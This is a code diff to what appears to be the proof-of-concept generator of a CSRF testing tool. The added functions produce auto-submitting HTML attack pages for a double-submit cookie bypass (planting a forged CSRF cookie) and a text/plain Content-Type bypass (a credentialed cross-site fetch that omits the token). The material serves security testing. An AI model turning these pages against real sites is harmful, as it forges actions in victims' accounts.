@@ -183,6 +183,84 @@ def gen_post_xhr_method_override(action: str, params: dict) -> str:
 
 
 # ----------------------------------------------------------------
+# P5c: Double-submit cookie bypass (T6)
+# Plants the forged CSRF cookie(s) client-side and submits the form with
+# the SAME forged value, so the server's cookie==body equality check passes.
+# CONDITIONAL: requires the attack page to be able to write the target's
+# CSRF cookie (same registrable domain / subdomain "cookie tossing", a
+# cookie-injection gadget, or an HTTP MITM). A purely cross-site page on an
+# unrelated origin cannot set this cookie — hence the inline note.
+# ----------------------------------------------------------------
+def gen_double_submit(action: str, params: dict, cookie_names: list[str]) -> str:
+    forged = "xsrfprobe_forged_token"
+    cookie_lc = {c.lower() for c in cookie_names}
+    form_params = {k: (forged if k.lower() in cookie_lc else v) for k, v in params.items()}
+    cookie_js = "\n".join(
+        f'    document.cookie = "{_esc_js_string(name)}=" + forged + "; path=/";'
+        for name in cookie_names
+    )
+    inputs = _hidden_inputs(form_params)
+    html = f"""<html>
+{ATTRIBUTION}
+<head><title>CSRF Double-Submit PoC</title></head>
+<body>
+  <!--
+    Double-submit bypass: the server only checks that the CSRF cookie equals
+    the body token, with no server-side/session binding. We set BOTH to the
+    same attacker-chosen value.
+
+    PRECONDITION: this page must be able to write the target's CSRF cookie.
+    That holds when it is served from the target's registrable domain or a
+    subdomain (cookie tossing), via a cookie-injection gadget (e.g. CRLF /
+    reflected Set-Cookie), or via an HTTP MITM. A cross-site page on an
+    unrelated origin cannot set this cookie, and the attack will fail with a
+    token mismatch.
+  -->
+  <script>
+    var forged = "{_esc_js_string(forged)}";
+{cookie_js}
+  </script>
+  <form id="csrfform" action="{_esc_attr(action)}" method="POST" enctype="application/x-www-form-urlencoded">
+{inputs}
+      <input type="submit" value="Submit" />
+  </form>
+  <script>document.getElementById('csrfform').submit();</script>
+</body>
+</html>"""
+    return _save_poc(f"{_sanitize_filename(action)}-double-submit.html", html)
+
+
+# ----------------------------------------------------------------
+# P5d: Content-Type bypass (M4)
+# Reproduces the detected bypass: the CSRF token is omitted and the body is
+# sent as text/plain — a CORS "simple" Content-Type, so the request fires
+# cross-site without a preflight. The server skips token validation for this
+# Content-Type while still processing the (URL-encoded) body.
+# ----------------------------------------------------------------
+def gen_content_type_bypass(action: str, params: dict) -> str:
+    body = urlencode(params)
+    html = f"""<html>
+{ATTRIBUTION}
+<head><title>CSRF Content-Type Bypass PoC</title></head>
+<body>
+  <script>
+    // text/plain is a CORS-safelisted Content-Type (no preflight), so this
+    // cross-site request is sent with the victim's cookies. The anti-CSRF token
+    // is intentionally omitted: the server skips token validation for this
+    // Content-Type.
+    fetch("{_esc_js_string(action)}", {{
+      method: "POST",
+      credentials: "include",
+      headers: {{ "Content-Type": "text/plain" }},
+      body: "{_esc_js_string(body)}"
+    }});
+  </script>
+</body>
+</html>"""
+    return _save_poc(f"{_sanitize_filename(action)}-content-type-bypass.html", html)
+
+
+# ----------------------------------------------------------------
 # P6: JSON via text/plain enctype trick
 # ----------------------------------------------------------------
 def gen_json_textplain(action: str, params: dict) -> str:
@@ -322,7 +400,7 @@ class PoCGenerator:
             logger.info("Generated %d PoC variant(s) for %s", len(paths), action)
             return paths
 
-        standard_form_bypasses = {"NO_TOKEN", "T3", "T7", "T4"}
+        standard_form_bypasses = {"D1", "D2", "T3", "T7", "T4"}
         xhr_bypasses = {"T8"}
         cookie_injection_bypasses = {"T5", "T6"}
         content_type_bypasses = {"M4"}
@@ -333,11 +411,24 @@ class PoCGenerator:
         is_multipart = (enctype == "multipart/form-data")
 
         if bypasses & standard_form_bypasses:
-            if is_multipart:
-                paths.append(gen_multipart_fetch(action, params))
+            # Use params consistent with the proven bypass: omission (D1/D2/T3)
+            # strips the token, empty-value (T7) blanks it, session-replay (T4)
+            # keeps the captured token. Never embed a stale token an attacker
+            # wouldn't possess when omission/empty is what actually works.
+            from xsrfprobe.files.discovered import ANTI_CSRF_TOKENS
+            token_names = {t.name for t in ANTI_CSRF_TOKENS}
+            if bypasses & {"D1", "D2", "T3"}:
+                form_params = {k: v for k, v in params.items() if k not in token_names}
+            elif "T7" in bypasses:
+                form_params = {k: ("" if k in token_names else v) for k, v in params.items()}
             else:
-                paths.append(gen_post_autosubmit(action, params))
-                paths.append(gen_referer_suppressed(action, params))
+                form_params = params
+
+            if is_multipart:
+                paths.append(gen_multipart_fetch(action, form_params))
+            else:
+                paths.append(gen_post_autosubmit(action, form_params))
+                paths.append(gen_referer_suppressed(action, form_params))
 
         if bypasses & {"T2"}:
             paths.append(gen_get_img(action, params))
@@ -358,14 +449,24 @@ class PoCGenerator:
             paths.append(gen_post_xhr(action, params))
 
         if bypasses & cookie_injection_bypasses:
-            if is_multipart:
+            from xsrfprobe.files.discovered import ANTI_CSRF_TOKENS
+            from xsrfprobe.core.schema import TokenDiscoveryPartEnum
+            cookie_names = [t.name for t in ANTI_CSRF_TOKENS
+                            if t.discovery_part == TokenDiscoveryPartEnum.COOKIE]
+            if cookie_names:
+                # T5/T6 both require planting the CSRF cookie cross-site; a plain
+                # form cannot reproduce the bypass (cookie wouldn't match body).
+                paths.append(gen_double_submit(action, params, cookie_names))
+            elif is_multipart:
                 paths.append(gen_multipart_fetch(action, params))
             else:
                 paths.append(gen_post_autosubmit(action, params))
 
         if bypasses & content_type_bypasses:
-            if not paths:
-                paths.append(gen_post_autosubmit(action, params))
+            from xsrfprobe.files.discovered import ANTI_CSRF_TOKENS
+            stripped_params = {k: v for k, v in params.items()
+                              if not any(t.name == k for t in ANTI_CSRF_TOKENS)}
+            paths.append(gen_content_type_bypass(action, stripped_params))
 
         if not paths:
             paths.append(gen_post_autosubmit(action, params))
